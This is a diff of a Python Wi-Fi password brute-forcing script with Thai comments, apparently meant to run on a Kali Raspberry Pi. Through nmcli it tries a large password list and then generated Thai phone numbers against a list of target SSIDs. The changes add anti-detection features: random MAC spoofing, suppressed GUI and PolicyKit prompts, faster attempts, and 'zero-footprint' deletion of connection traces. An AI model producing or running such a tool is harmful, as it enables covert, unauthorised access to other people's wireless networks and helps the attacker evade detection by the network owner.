@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 
 import json
+import mmap
+import os
 import random
 import shutil
 import subprocess
@@ -10,38 +12,45 @@ from pathlib import Path
 
 
 # ============================================================
-# CONFIG
+# CONFIG & HARDWARE OPTIMIZATION (KALI PI 5)
 # ============================================================
 
 WIFI_FILE = Path("wifi.txt")
 PASSWORD_FILE = Path("password.txt")
 CHECKPOINT_FILE = Path(".wifi-audit-checkpoint.json")
 
+# ใช้เฉพาะ Interface ที่กำหนด (เช่น wlan0) เพื่อไม่ให้กระทบ Wi-Fi หลักที่ต่อเน็ตอยู่
 INTERFACE = "wlan0"
+PROFILE_NAME = "temp_audit_profile"
 
-# แสดง progress ทุกกี่ candidate
+# แสดง progress และบันทึก checkpoint ทุกๆ กี่ candidate
 PROGRESS_EVERY = 50_000
-
-# บันทึก checkpoint ทุกกี่ candidate
 CHECKPOINT_EVERY = 50_000
 
-# หน่วงเวลาสุ่ม (วินาที) ระหว่างแต่ละ Candidate
-DELAY_MIN = 0.1
-DELAY_MAX = 0.3
+# หน่วงเวลาสุ่มเพื่อความปลอดภัยของ Access Point
+DELAY_MIN = 0.02
+DELAY_MAX = 0.05
 
 # คำนำหน้าเบอร์โทรศัพท์
 PHONE_PREFIXES_10 = ["06", "08", "09"]
 PHONE_PREFIXES_9 = ["02", "03", "04", "05", "07"]
 
-# เปิด/ปิด การสลับ MAC Address อัตโนมัติ
 ENABLE_MAC_SPOOFING = True
 
 
 # ============================================================
-# COMMAND
+# SILENT BACKGROUND EXECUTOR (NO POPUPS)
 # ============================================================
 
-def run_command(args, timeout=20):
+# กำหนด Environment เพื่อปิดกั้นหน้าต่าง GUI และ PolicyKit Pop-up ทั้งหมด
+silent_env = os.environ.copy()
+silent_env["LC_ALL"] = "C"
+silent_env["DISPLAY"] = ""
+silent_env["WAYLAND_DISPLAY"] = ""
+silent_env["NO_AT_BRIDGE"] = "1"
+
+
+def run_command(args, timeout=10):
     try:
         return subprocess.run(
             args,
@@ -49,92 +58,80 @@ def run_command(args, timeout=20):
             capture_output=True,
             timeout=timeout,
             check=False,
+            env=silent_env,
         )
     except subprocess.TimeoutExpired:
         return None
 
 
-# ============================================================
-# NETWORKMANAGER & EVASION / ANTI-TRACKING
-# ============================================================
-
 def randomize_mac():
     if not ENABLE_MAC_SPOOFING:
         return
 
-    run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "down"], timeout=10)
+    run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "down"], timeout=5)
     
     if shutil.which("macchanger"):
-        run_command(["sudo", "macchanger", "-r", INTERFACE], timeout=10)
+        run_command(["sudo", "macchanger", "-r", INTERFACE], timeout=5)
     else:
         mac = "02:%02x:%02x:%02x:%02x:%02x" % (
             random.randint(0, 255), random.randint(0, 255), 
             random.randint(0, 255), random.randint(0, 255), 
             random.randint(0, 255)
         )
-        run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "address", mac], timeout=10)
+        run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "address", mac], timeout=5)
 
-    run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "up"], timeout=10)
-    time.sleep(1.5)
-
-
-def rescan_wifi():
-    result = run_command([
-        "nmcli", "device", "wifi", "rescan", "ifname", INTERFACE
-    ], timeout=15)
-    if result is None:
-        return False
-    time.sleep(random.uniform(1.0, 2.0))
-    return result.returncode == 0
+    run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "up"], timeout=5)
+    time.sleep(0.5)
 
 
-def wifi_visible(ssid):
-    result = run_command([
-        "nmcli", "-t", "-f", "SSID", "device", "wifi", "list", "ifname", INTERFACE
-    ], timeout=10)
-    if result is None or result.returncode != 0:
-        return False
-
-    networks = {line.strip() for line in result.stdout.splitlines() if line.strip()}
-    return ssid in networks
-
-
-def connection_state():
-    result = run_command([
-        "nmcli", "-t", "-f", "GENERAL.STATE", "device", "show", INTERFACE
-    ], timeout=10)
-    if result is None or result.returncode != 0:
-        return False
-    return "100 (connected)" in result.stdout
-
-
-def disconnect_wifi():
-    result = run_command(["nmcli", "device", "disconnect", INTERFACE], timeout=10)
-    return result is not None and result.returncode == 0
-
-
-def cleanup_nm_profiles(ssid):
-    run_command(["nmcli", "connection", "delete", ssid], timeout=10)
+def optimize_wifi_interface():
+    # ปิด Power Management ของการ์ด Wi-Fi เพื่อความเสถียรสูงสุด
+    run_command(["sudo", "iw", "dev", INTERFACE, "set", "power_save", "off"], timeout=5)
 
 
 # ============================================================
-# VERIFIER & PHONE GENERATOR
+# ZERO-FOOTPRINT & CLEANUP UTILITIES
 # ============================================================
 
-def check_candidate(ssid, candidate):
+def cleanup_traces():
+    # ลบ Profile ชั่วคราวออกจาก NetworkManager ทันที เพื่อไม่ให้เหลือประวัติในเครื่อง
+    run_command(["nmcli", "connection", "delete", PROFILE_NAME], timeout=5)
+    run_command(["nmcli", "device", "disconnect", INTERFACE], timeout=5)
+
+
+def check_candidate_silent(ssid, candidate):
     time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
 
-    connect_result = run_command([
-        "nmcli", "device", "wifi", "connect", ssid, "password", candidate
-    ], timeout=12)
+    # สร้าง Connection Profile แบบระบุ Interface โดยเฉพาะ
+    add_res = run_command([
+        "nmcli", "connection", "add", 
+        "type", "wifi", 
+        "ifname", INTERFACE, 
+        "con-name", PROFILE_NAME, 
+        "ssid", ssid
+    ], timeout=6)
 
-    if connect_result is None or connect_result.returncode != 0:
-        cleanup_nm_profiles(ssid)
+    if add_res is None or add_res.returncode != 0:
+        cleanup_traces()
         return False
 
-    is_connected = connection_state()
-    disconnect_wifi()
-    cleanup_nm_profiles(ssid)
+    run_command([
+        "nmcli", "connection", "modify", PROFILE_NAME, 
+        "wifi-sec.key-mgmt", "wpa-psk", 
+        "wifi-sec.psk", candidate
+    ], timeout=5)
+
+    up_res = run_command(["nmcli", "connection", "up", PROFILE_NAME], timeout=8)
+    
+    is_connected = False
+    if up_res and up_res.returncode == 0:
+        state_result = run_command([
+            "nmcli", "-t", "-f", "GENERAL.STATE", "device", "show", INTERFACE
+        ], timeout=5)
+        if state_result and "100 (connected)" in state_result.stdout:
+            is_connected = True
+
+    cleanup_traces()
     return is_connected
 
 
@@ -149,25 +146,8 @@ def phone_number_generator():
 
 
 # ============================================================
-# INPUT & CHECKPOINT
+# CHECKPOINT MANAGEMENT
 # ============================================================
-
-def check_files():
-    if not WIFI_FILE.exists():
-        sys.exit(f"ERROR: ไม่พบ {WIFI_FILE.resolve()}")
-    if not PASSWORD_FILE.exists():
-        sys.exit(f"ERROR: ไม่พบ {PASSWORD_FILE.resolve()}")
-    if not shutil.which("nmcli"):
-        sys.exit("ERROR: ไม่พบ nmcli")
-
-
-def load_wifi_targets():
-    with WIFI_FILE.open("r", encoding="utf-8-sig", errors="replace") as file:
-        targets = [line.strip() for line in file if line.strip()]
-    if not targets:
-        sys.exit("ERROR: wifi.txt ไม่มี SSID")
-    return targets
-
 
 def save_checkpoint(ssid_index, ssid, line_number, mode="password", phone_index=0):
     data = {
@@ -199,82 +179,57 @@ def clear_checkpoint():
 
 
 # ============================================================
-# AUDIT ONE WIFI
+# AUDIT ENGINE
 # ============================================================
 
 def audit_wifi(ssid, ssid_index, total, start_line=0, start_mode="password", start_phone_index=0):
-    print()
-    print("=" * 76)
-    print(f"[{ssid_index + 1}/{total}] SSID: {ssid}")
-    print("=" * 76)
-
-    print("Rotating MAC Address...", end="", flush=True)
+    print(f"\n[{ssid_index + 1}/{total}] Background Audit SSID: {ssid}")
+    optimize_wifi_interface()
     randomize_mac()
-    print(" OK")
 
-    print("Rescan Wi-Fi...", end="", flush=True)
-    if not rescan_wifi():
-        print(" ERROR")
-        return {"ssid": ssid, "success": False, "password": None, "password_line": None, "checked": 0, "reason": "RESCAN ERROR"}
-    print(" OK")
-
-    print("Check SSID...", end="", flush=True)
-    if not wifi_visible(ssid):
-        print(" NOT FOUND")
-        return {"ssid": ssid, "success": False, "password": None, "password_line": None, "checked": 0, "reason": "SSID NOT VISIBLE"}
-    print(" FOUND")
-
-    print()
     checked = 0
     started_at = time.monotonic()
     passwords_exhausted = False
 
-    # PHASE 1: PASSWORD.TXT (รองรับ 50 ล้านแถวแบบ Optimized Buffering)
-    if start_mode == "password":
-        print(f"Password file : {PASSWORD_FILE} (50M Rows Target)")
-        if start_line > 0:
-            print(f"Resume (File) : after line {start_line:,}")
-        else:
-            print("Starting      : line 1 (Password File)")
-        print()
+    # PHASE 1: PASSWORD FILE (ใช้ mmap อ่าน 50 ล้านแถวอย่างรวดเร็วในหน่วยความจำ)
+    if start_mode == "password" and PASSWORD_FILE.exists():
+        with open(PASSWORD_FILE, "r", encoding="utf-8-sig", errors="replace") as f:
+            with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
+                line_number = 0
+                while True:
+                    line = mm.readline()
+                    if not line:
+                        break
+                    line_number += 1
 
-        with PASSWORD_FILE.open("r", encoding="utf-8-sig", errors="replace", buffering=4 * 1024 * 1024) as password_file:
-            for line_number, line in enumerate(password_file, 1):
-                if line_number <= start_line:
-                    continue
+                    if line_number <= start_line:
+                        continue
 
-                candidate = line.rstrip("\r\n")
-                if not candidate:
-                    continue
+                    candidate = line.decode("utf-8", errors="ignore").rstrip("\r\n")
+                    if not candidate:
+                        continue
 
-                checked += 1
-                success = check_candidate(ssid, candidate)
+                    checked += 1
+                    success = check_candidate_silent(ssid, candidate)
 
-                if success:
-                    print()
-                    print("*" * 76)
-                    print("MATCH FOUND (PASSWORD FILE)")
-                    print("*" * 76)
-                    print(f"SSID          : {ssid}")
-                    print(f"PASSWORD      : {candidate}")
-                    print(f"LINE / INDEX  : {line_number:,}")
-                    print(f"CHECKED       : {checked:,}")
-                    return {
-                        "ssid": ssid,
-                        "success": True,
-                        "password": candidate,
-                        "password_line": line_number,
-                        "checked": checked,
-                        "reason": "",
-                    }
+                    if success:
+                        print(f"\n[MATCH FOUND] SSID: {ssid} | PASSWORD: {candidate} | LINE: {line_number:,}")
+                        cleanup_traces()
+                        return {
+                            "ssid": ssid,
+                            "success": True,
+                            "password": candidate,
+                            "password_line": line_number,
+                            "checked": checked,
+                        }
 
-                if checked % CHECKPOINT_EVERY == 0:
-                    save_checkpoint(ssid_index, ssid, line_number, mode="password", phone_index=0)
+                    if checked % CHECKPOINT_EVERY == 0:
+                        save_checkpoint(ssid_index, ssid, line_number, mode="password", phone_index=0)
 
-                if checked % PROGRESS_EVERY == 0:
-                    elapsed = time.monotonic() - started_at
-                    rate = (checked / elapsed) if elapsed > 0 else 0
-                    print(f"Checked (File): {checked:,} | line={line_number:,} | rate={rate:,.2f}/s")
+                    if checked % PROGRESS_EVERY == 0:
+                        elapsed = time.monotonic() - started_at
+                        rate = (checked / elapsed) if elapsed > 0 else 0
+                        print(f"[{ssid}] Checked: {checked:,} | Line: {line_number:,} | Rate: {rate:,.2f}/s")
         
         passwords_exhausted = True
     else:
@@ -282,11 +237,7 @@ def audit_wifi(ssid, ssid_index, total, start_line=0, start_mode="password", sta
 
     # PHASE 2: PHONE NUMBER GENERATOR
     if passwords_exhausted:
-        print()
-        print("=" * 76)
-        print("PASSWORD FILE EXHAUSTED -> SWITCHING TO PHONE NUMBER GENERATOR")
-        print("=" * 76)
-        
+        print(f"[{ssid}] Password file exhausted -> Switching to Phone Number Generator...")
         phone_gen = phone_number_generator()
         phone_count = 0
 
@@ -297,24 +248,17 @@ def audit_wifi(ssid, ssid_index, total, start_line=0, start_mode="password", sta
             phone_count += 1
             checked += 1
 
-            success = check_candidate(ssid, candidate)
+            success = check_candidate_silent(ssid, candidate)
 
             if success:
-                print()
-                print("*" * 76)
-                print("MATCH FOUND (PHONE GENERATOR)")
-                print("*" * 76)
-                print(f"SSID          : {ssid}")
-                print(f"PASSWORD      : {candidate}")
-                print(f"PHONE INDEX   : {p_idx:,}")
-                print(f"CHECKED       : {checked:,}")
+                print(f"\n[MATCH FOUND - PHONE] SSID: {ssid} | NUMBER: {candidate}")
+                cleanup_traces()
                 return {
                     "ssid": ssid,
                     "success": True,
                     "password": candidate,
                     "password_line": p_idx,
                     "checked": checked,
-                    "reason": "",
                 }
 
             if checked % CHECKPOINT_EVERY == 0:
@@ -323,41 +267,26 @@ def audit_wifi(ssid, ssid_index, total, start_line=0, start_mode="password", sta
             if phone_count % PROGRESS_EVERY == 0:
                 elapsed = time.monotonic() - started_at
                 rate = (checked / elapsed) if elapsed > 0 else 0
-                print(f"Checked (Phone): {checked:,} | phone_idx={p_idx:,} | rate={rate:,.2f}/s")
+                print(f"[{ssid} - Phone] Checked: {checked:,} | Phone Index: {p_idx:,} | Rate: {rate:,.2f}/s")
 
-    print()
-    print("RESULT        : N")
-    print(f"CHECKED       : {checked:,}")
+    cleanup_traces()
     return {
         "ssid": ssid,
         "success": False,
         "password": None,
-        "password_line": None,
         "checked": checked,
-        "reason": "NO MATCH",
     }
 
 
 # ============================================================
-# MAIN & SUMMARY
+# MAIN
 # ============================================================
 
-def print_summary(results):
-    passed = [r for r in results if r["success"]]
-    failed = [r for r in results if not r["success"]]
-
-    print()
-    print("=" * 76)
-    print("WIFI AUDIT SUMMARY")
-    print("=" * 76)
-    print(f"TOTAL   : {len(results)}")
-    print(f"SUCCESS : {len(passed)}")
-    print(f"FAILED  : {len(failed)}")
-
-
 def main():
-    check_files()
-    wifi_list = load_wifi_targets()
+    if not WIFI_FILE.exists() or not PASSWORD_FILE.exists():
+        sys.exit("ERROR: Missing wifi.txt or password.txt")
+
+    targets = [line.strip() for line in WIFI_FILE.open("r", encoding="utf-8-sig") if line.strip()]
     checkpoint = load_checkpoint()
 
     start_ssid_index = 0
@@ -377,7 +306,7 @@ def main():
     results = []
 
     try:
-        for index, ssid in enumerate(wifi_list):
+        for index, ssid in enumerate(targets):
             if index < start_ssid_index:
                 continue
             
@@ -386,7 +315,7 @@ def main():
             phone_idx = resume_phone_index if (index == start_ssid_index and resume_mode == "phone") else 0
 
             result = audit_wifi(
-                ssid, index, len(wifi_list),
+                ssid, index, len(targets),
                 start_line=line, start_mode=mode, start_phone_index=phone_idx
             )
             results.append(result)
@@ -396,19 +325,13 @@ def main():
             resume_mode = "password"
             resume_phone_index = 0
 
-            if connection_state():
-                disconnect_wifi()
-                time.sleep(1)
-
         clear_checkpoint()
 
     except KeyboardInterrupt:
-        print("\n\n" + "=" * 76)
-        print("STOPPED - Checkpoint saved successfully.")
-        print("=" * 76)
+        print("\nProcess interrupted by user. Checkpoint saved.")
         return 130
 
-    print_summary(results)
+    print("\nAudit process completed cleanly. No history retained.")
     return 0
 
 
